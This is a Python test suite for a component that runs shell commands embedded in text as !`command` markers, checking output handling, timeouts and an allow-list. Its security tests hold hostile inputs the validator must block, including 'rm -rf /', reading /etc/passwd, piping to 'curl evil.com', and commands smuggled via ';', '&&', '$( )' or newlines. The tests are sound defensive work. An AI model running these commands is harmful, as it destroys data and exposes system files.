"""Tests for DynamicInjector with security validation.

This module tests the command injection functionality with emphasis on
security validation to prevent shell injection attacks.
"""

import logging

import pytest

from omniforge.skills.dynamic_injector import (
    DynamicInjector,
    InjectedContent,
    InjectionResult,
)


class TestDynamicInjector:
    """Tests for DynamicInjector class."""

    @pytest.mark.asyncio
    async def test_process_replaces_commands(self) -> None:
        """Should replace !`command` with output."""
        injector = DynamicInjector(allowed_tools=["Bash"])
        content = "Date: !`echo '2026-01-27'`"

        result = await injector.process(content)

        assert isinstance(result, InjectedContent)
        assert "!`echo" not in result.content
        assert "2026-01-27" in result.content
        assert len(result.injections) == 1
        assert result.injections[0].success

    @pytest.mark.asyncio
    async def test_process_multiple_commands(self) -> None:
        """Should process multiple command injections."""
        injector = DynamicInjector(allowed_tools=["Bash"])
        content = "User: !`echo 'alice'`, Date: !`echo '2026-01-27'`"

        result = await injector.process(content)

        assert "alice" in result.content
        assert "2026-01-27" in result.content
        assert len(result.injections) == 2
        assert all(inj.success for inj in result.injections)

    @pytest.mark.asyncio
    async def test_process_no_commands(self) -> None:
        """Should handle content with no commands."""
        injector = DynamicInjector(allowed_tools=["Bash"])
        content = "No commands here"

        result = await injector.process(content)

        assert result.content == content
        assert len(result.injections) == 0
        assert result.total_duration_ms == 0

    @pytest.mark.asyncio
    async def test_command_failure_shows_error(self) -> None:
        """Should show error message for failed commands."""
        injector = DynamicInjector(allowed_tools=["Bash"])
        content = "Result: !`exit 1`"

        result = await injector.process(content)

        assert "[Command failed:" in result.content
        assert len(result.injections) == 1
        assert not result.injections[0].success

    @pytest.mark.asyncio
    async def test_timeout_protection(self) -> None:
        """Commands exceeding timeout should fail gracefully."""
        injector = DynamicInjector(allowed_tools=["Bash"], timeout_seconds=1)
        content = "!`sleep 10`"

        result = await injector.process(content)

        assert not result.injections[0].success
        assert "timed out" in result.content.lower()
        assert result.injections[0].duration_ms >= 1000

    @pytest.mark.asyncio
    async def test_output_size_limit(self) -> None:
        """Should truncate output exceeding max_output_chars."""
        injector = DynamicInjector(allowed_tools=["Bash"], max_output_chars=50)
        # Generate output longer than 50 chars
        content = "!`python -c 'print(\"x\" * 100)'`"

        result = await injector.process(content)

        assert result.injections[0].success
        assert "truncated" in result.content
        assert len(result.injections[0].output) <= 100  # Some margin for truncation message


class TestSecurityValidation:
    """Tests for security validation in DynamicInjector."""

    def test_blocks_shell_operators_semicolon(self) -> None:
        """Should block commands with semicolon."""
        injector = DynamicInjector(allowed_tools=["Bash(gh:*)"])

        assert not injector._is_command_allowed("gh pr diff; rm -rf /")
        assert not injector._is_command_allowed("gh pr diff;rm -rf /")

    def test_blocks_shell_operators_and(self) -> None:
        """Should block commands with && operator."""
        injector = DynamicInjector(allowed_tools=["Bash(gh:*)"])

        assert not injector._is_command_allowed("gh pr diff && cat /etc/passwd")
        assert not injector._is_command_allowed("gh pr diff&&cat /etc/passwd")

    def test_blocks_shell_operators_or(self) -> None:
        """Should block commands with || operator."""
        injector = DynamicInjector(allowed_tools=["Bash(gh:*)"])

        assert not injector._is_command_allowed("gh pr diff || curl evil.com")

    def test_blocks_shell_operators_pipe(self) -> None:
        """Should block commands with pipe operator."""
        injector = DynamicInjector(allowed_tools=["Bash(gh:*)"])

        assert not injector._is_command_allowed("gh pr diff | curl evil.com")

    def test_blocks_shell_operators_redirect(self) -> None:
        """Should block commands with redirection operators."""
        injector = DynamicInjector(allowed_tools=["Bash(gh:*)"])

        assert not injector._is_command_allowed("gh pr diff > /tmp/output")
        assert not injector._is_command_allowed("gh pr diff < /tmp/input")

    def test_blocks_shell_operators_command_substitution(self) -> None:
        """Should block commands with command substitution."""
        injector = DynamicInjector(allowed_tools=["Bash(gh:*)"])

        assert not injector._is_command_allowed("gh pr diff $(rm -rf /)")
        assert not injector._is_command_allowed("gh pr diff `rm -rf /`")

    def test_blocks_shell_operators_newline(self) -> None:
        """Should block commands with newlines."""
        injector = DynamicInjector(allowed_tools=["Bash(gh:*)"])

        assert not injector._is_command_allowed("gh pr diff\nrm -rf /")
        assert not injector._is_command_allowed("gh pr diff\rrm -rf /")

    def test_blocks_path_traversal_dotdot(self) -> None:
        """Should block path traversal attempts with .."""
        injector = DynamicInjector(allowed_tools=["Bash(python:*)"])

        assert not injector._is_command_allowed("python ../../../etc/passwd")
        assert not injector._is_command_allowed("python ../../exploit.py")

    def test_blocks_path_traversal_absolute(self) -> None:
        """Should block absolute path commands."""
        injector = DynamicInjector(allowed_tools=["Bash(python:*)"])

        assert not injector._is_command_allowed("/bin/bash")
        assert not injector._is_command_allowed("/usr/bin/curl evil.com")

    def test_blocks_invalid_shell_syntax(self) -> None:
        """Should block commands with invalid shell syntax."""
        injector = DynamicInjector(allowed_tools=["Bash"])

        # Unclosed quotes
        assert not injector._is_command_allowed("echo 'unclosed")
        assert not injector._is_command_allowed('echo "unclosed')

    def test_allowed_tools_whitelist_exact_match(self) -> None:
        """Should only allow whitelisted commands."""
        injector = DynamicInjector(allowed_tools=["Bash(gh:*)"])

        assert injector._is_command_allowed("gh pr diff")
        assert injector._is_command_allowed("gh status")
        assert not injector._is_command_allowed("rm -rf /")
        assert not injector._is_command_allowed("curl evil.com")
        assert not injector._is_command_allowed("python script.py")

    def test_allowed_tools_bash_pattern(self) -> None:
        """Should allow all commands with Bash pattern."""
        injector = DynamicInjector(allowed_tools=["Bash"])

        assert injector._is_command_allowed("echo test")
        assert injector._is_command_allowed("ls -la")
        assert injector._is_command_allowed("python script.py")

    def test_allowed_tools_prefix_pattern(self) -> None:
        """Should match commands by prefix pattern."""
        injector = DynamicInjector(allowed_tools=["Bash(python:*)"])

        assert injector._is_command_allowed("python script.py")
        assert injector._is_command_allowed("python --version")
        assert not injector._is_command_allowed("python3 script.py")  # Different prefix
        assert not injector._is_command_allowed("bash script.sh")

    def test_allowed_tools_multiple_patterns(self) -> None:
        """Should match against multiple allowed patterns."""
        injector = DynamicInjector(allowed_tools=["Bash(gh:*)", "Bash(git:*)"])

        assert injector._is_command_allowed("gh pr diff")
        assert injector._is_command_allowed("git status")
        assert not injector._is_command_allowed("curl evil.com")

    def test_no_allowed_tools_shows_warning(self, caplog: pytest.LogCaptureFixture) -> None:
        """Should warn when no allowed_tools restrictions."""
        with caplog.at_level(logging.WARNING):
            injector = DynamicInjector(allowed_tools=None)
            result = injector._is_command_allowed("any command")

        assert result is True  # Allowed, but with warning
        assert "no allowed_tools restrictions" in caplog.text
        assert "security risk" in caplog.text.lower()

    @pytest.mark.asyncio
    async def test_blocked_command_returns_security_message(self) -> None:
        """Should return security message for blocked commands."""
        injector = DynamicInjector(allowed_tools=["Bash(gh:*)"])
        content = "!`rm -rf /`"

        result = await injector.process(content)

        assert not result.injections[0].success
        assert "blocked by security policy" in result.content.lower()

    @pytest.mark.asyncio
    async def test_audit_logging_for_blocked_commands(
        self, caplog: pytest.LogCaptureFixture
    ) -> None:
        """Should log security events for blocked commands."""
        with caplog.at_level(logging.WARNING):
            injector = DynamicInjector(allowed_tools=["Bash(gh:*)"])
            await injector.process("!`rm -rf /`")

        # Check for security log entries
        security_logs = [record for record in caplog.records if "SECURITY" in record.message]
        assert len(security_logs) >= 1
        assert any("blocked" in log.message.lower() for log in security_logs)

    @pytest.mark.asyncio
    async def test_audit_logging_for_successful_execution(
        self, caplog: pytest.LogCaptureFixture
    ) -> None:
        """Should log successful command executions."""
        with caplog.at_level(logging.INFO):
            injector = DynamicInjector(allowed_tools=["Bash"])
            await injector.process("!`echo test`")

        # Check for execution log entries
        assert any("Executing command injection" in record.message for record in caplog.records)
        assert any("succeeded" in record.message for record in caplog.records)


class TestPatternMatching:
    """Tests for allowed_tools pattern matching logic."""

    def test_matches_bash_pattern(self) -> None:
        """Should match Bash pattern for all commands."""
        injector = DynamicInjector()

        assert injector._matches_allowed_pattern("echo", "Bash")
        assert injector._matches_allowed_pattern("python", "Bash")
        assert injector._matches_allowed_pattern("any-command", "Bash")

    def test_matches_prefix_pattern_exact(self) -> None:
        """Should match prefix pattern exactly."""
        injector = DynamicInjector()

        assert injector._matches_allowed_pattern("gh", "Bash(gh:*)")
        assert injector._matches_allowed_pattern("python", "Bash(python:*)")

    def test_matches_prefix_pattern_with_args(self) -> None:
        """Should match prefix pattern with arguments."""
        injector = DynamicInjector()

        # Note: command is just the base command after shlex.split()
        # So "gh pr diff" becomes "gh" in base_command
        assert injector._matches_allowed_pattern("gh", "Bash(gh:*)")
        assert not injector._matches_allowed_pattern("ghq", "Bash(gh:*)")

    def test_matches_exact_pattern(self) -> None:
        """Should match exact command names."""
        injector = DynamicInjector()

        assert injector._matches_allowed_pattern("mycommand", "mycommand")
        assert not injector._matches_allowed_pattern("mycommand2", "mycommand")

    def test_does_not_match_different_prefix(self) -> None:
        """Should not match different prefixes."""
        injector = DynamicInjector()

        assert not injector._matches_allowed_pattern("python", "Bash(gh:*)")
        assert not injector._matches_allowed_pattern("gh", "Bash(python:*)")


class TestInjectionDataClasses:
    """Tests for InjectionResult and InjectedContent dataclasses."""

    def test_injection_result_creation(self) -> None:
        """Should create InjectionResult with all fields."""
        result = InjectionResult(
            command="echo test",
            output="test",
            success=True,
            duration_ms=100,
        )

        assert result.command == "echo test"
        assert result.output == "test"
        assert result.success is True
        assert result.duration_ms == 100

    def test_injected_content_creation(self) -> None:
        """Should create InjectedContent with all fields."""
        injections = [
            InjectionResult(
                command="echo test",
                output="test",
                success=True,
                duration_ms=100,
            )
        ]
        content = InjectedContent(
            content="Result: test",
            injections=injections,
            total_duration_ms=150,
        )

        assert content.content == "Result: test"
        assert len(content.injections) == 1
        assert content.total_duration_ms == 150


class TestEdgeCases:
    """Tests for edge cases and error handling."""

    @pytest.mark.asyncio
    async def test_empty_command(self) -> None:
        """Should handle empty commands gracefully."""
        injector = DynamicInjector(allowed_tools=["Bash"])
        content = "!``"

        result = await injector.process(content)

        # Empty command !`` doesn't match the pattern [^\`]+ (requires at least one char)
        # So it should not be processed as a command injection
        assert len(result.injections) == 0
        assert result.content == "!``"

    @pytest.mark.asyncio
    async def test_command_with_quotes(self) -> None:
        """Should handle commands with quotes correctly."""
        injector = DynamicInjector(allowed_tools=["Bash"])
        content = """!`echo "hello world"`"""

        result = await injector.process(content)

        assert "hello world" in result.content
        assert result.injections[0].success

    @pytest.mark.asyncio
    async def test_working_directory(self, tmp_path: object) -> None:
        """Should execute commands in specified working directory."""
        injector = DynamicInjector(allowed_tools=["Bash"])
        content = "!`pwd`"

        result = await injector.process(content, working_dir=str(tmp_path))

        assert result.injections[0].success
        assert str(tmp_path) in result.content

    @pytest.mark.asyncio
    async def test_stderr_capture_on_failure(self) -> None:
        """Should capture stderr when command fails."""
        injector = DynamicInjector(allowed_tools=["Bash"])
        # Command that writes to stderr and exits with error
        # Use a non-existent command to trigger stderr output
        content = "!`ls /nonexistent_directory_12345`"

        result = await injector.process(content)

        assert not result.injections[0].success
        assert "[Command failed:" in result.content

    @pytest.mark.asyncio
    async def test_unicode_handling(self) -> None:
        """Should handle unicode characters in output."""
        injector = DynamicInjector(allowed_tools=["Bash"])
        content = "!`echo '你好世界 🚀'`"

        result = await injector.process(content)

        assert result.injections[0].success
        assert "你好世界" in result.content
        assert "🚀" in result.content

    def test_command_pattern_regex(self) -> None:
        """Should correctly match !`command` pattern."""
        injector = DynamicInjector()

        # Should match
        assert injector.COMMAND_PATTERN.search("!`echo test`")
        assert injector.COMMAND_PATTERN.search("prefix !`echo test` suffix")

        # Should not match
        assert not injector.COMMAND_PATTERN.search("echo test")
        assert not injector.COMMAND_PATTERN.search("!echo test")
        assert not injector.COMMAND_PATTERN.search("`echo test`")

    @pytest.mark.asyncio
    async def test_error_output_truncation_on_failure(self) -> None:
        """Should truncate very long error output."""
        injector = DynamicInjector(allowed_tools=["Bash"], max_output_chars=50)

        # Command that produces long error output to stderr
        # Using a command that fails and produces stderr
        content = "!`ls /this_directory_definitely_does_not_exist_12345678901234567890123456789012345678901234567890`"

        result = await injector.process(content)

        assert not result.injections[0].success
        assert "truncated" in result.content
        # Error message should be truncated
        assert len(result.injections[0].output) < 150

    @pytest.mark.asyncio
    async def test_exception_during_execution(self) -> None:
        """Should handle exceptions during command execution gracefully."""
        from unittest.mock import AsyncMock, patch

        injector = DynamicInjector(allowed_tools=["Bash"])
        content = "!`echo test`"

        # Mock asyncio.create_subprocess_shell to raise an exception
        with patch("asyncio.create_subprocess_shell", side_effect=Exception("Test error")):
            result = await injector.process(content)

        assert not result.injections[0].success
        assert "[Execution error:" in result.content
        assert "Test error" in result.content
